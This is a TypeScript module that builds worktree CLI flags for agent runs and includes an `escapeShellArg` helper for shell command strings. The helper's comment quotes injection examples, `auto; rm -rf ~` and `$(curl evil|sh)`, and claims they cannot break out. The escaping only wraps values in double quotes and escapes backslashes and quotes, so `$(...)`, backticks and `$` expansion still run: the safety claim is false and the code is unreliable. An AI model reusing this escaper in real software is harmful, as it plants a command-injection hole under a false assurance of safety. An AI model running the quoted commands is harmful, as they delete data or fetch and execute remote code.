/**
 * @description Resolves and formats agent CLI `-w` / `--worktree` flags for Ralph iterations.
 */

import type { WorkflowConfigRunner } from '@openthrottle/openthrottle-agentic-workflow';

/** Sentinel: pass `--worktree` with no name (CLI optional argument). */
export const RALPH_WORKTREE_FLAG_ONLY = '' as const;

export type RalphWorktreeName = string | typeof RALPH_WORKTREE_FLAG_ONLY;

/**
 * @description Optional agent worktree flags for one iteration.
 */
export interface RalphWorktreeCliOptions {
  /** Cursor-only: `--skip-worktree-setup`. */
  readonly skipWorktreeSetup?: boolean;
  readonly worktree?: RalphWorktreeName;
  /** Cursor-only: branch/ref for `--worktree-base`. */
  readonly worktreeBase?: string;
}

/**
 * @description Merges worktree name from CLI, env/file seed, and BullMQ handoff default.
 * Precedence: explicit `cli` > `seed` > `handoffTargetId` > omit.
 */
export const resolveRalphWorktreeName = (sources: {
  readonly cli?: RalphWorktreeName | undefined;
  readonly handoffTargetId?: string | undefined;
  readonly seed?: string | undefined;
}): RalphWorktreeName | undefined => {
  if (sources.cli !== undefined) {
    return sources.cli;
  }

  const fromSeed = sources.seed?.trim();
  if (fromSeed !== undefined && fromSeed !== '') {
    return fromSeed;
  }

  const fromHandoff = sources.handoffTargetId?.trim();
  if (fromHandoff !== undefined && fromHandoff !== '') {
    return fromHandoff;
  }

  return undefined;
};

const formatWorktreeFlagArgv = (name: RalphWorktreeName): string[] => {
  if (name === RALPH_WORKTREE_FLAG_ONLY) {
    return ['--worktree'];
  }

  return ['--worktree', name];
};

/**
 * @description Appends argv segments for nested `workflow-ralph` when worktree is configured.
 */
export const buildWorktreeNestedArgv = (
  worktree: RalphWorktreeName | undefined,
  extras?: {
    readonly skipWorktreeSetup?: boolean;
    readonly worktreeBase?: string;
  },
): string[] => {
  if (worktree === undefined) {
    return [];
  }

  const argv = [...formatWorktreeFlagArgv(worktree)];

  const base = extras?.worktreeBase?.trim();
  if (base !== undefined && base !== '') {
    argv.push('--worktree-base', base);
  }

  if (extras?.skipWorktreeSetup === true) {
    argv.push('--skip-worktree-setup');
  }

  return argv;
};

/**
 * @description Appends shell flags to a cursor-agent or claude command string.
 */
export const appendRalphWorktreeShellFlags = (
  command: string,
  backend: WorkflowConfigRunner,
  options: RalphWorktreeCliOptions | undefined,
): string => {
  if (options?.worktree === undefined) {
    return command;
  }

  const parts: string[] = [];
  const name = options.worktree;
  if (name === RALPH_WORKTREE_FLAG_ONLY) {
    parts.push('-w');
  } else {
    parts.push('-w', escapeShellArg(name));
  }

  if (backend === 'cursor') {
    const base = options.worktreeBase?.trim();
    if (base !== undefined && base !== '') {
      parts.push('--worktree-base', escapeShellArg(base));
    }

    if (options.skipWorktreeSetup === true) {
      parts.push('--skip-worktree-setup');
    }
  }

  return `${command} ${parts.join(' ')}`;
};

/**
 * @description Escapes an arbitrary value for safe use as a single argument inside a
 * `shell: true` command string. Values matching the safe charset are passed through
 * verbatim; anything else is wrapped in double quotes with `\` and `"` escaped, so a
 * value like `auto; rm -rf ~` or `$(curl evil|sh)` cannot break out of the argument.
 */
export const escapeShellArg = (value: string): string => {
  if (/^[A-Za-z0-9._/-]+$/.test(value)) {
    return value;
  }

  return `"${value.replace(/\\/g, '\\\\').replace(/"/g, '\\"')}"`;
};
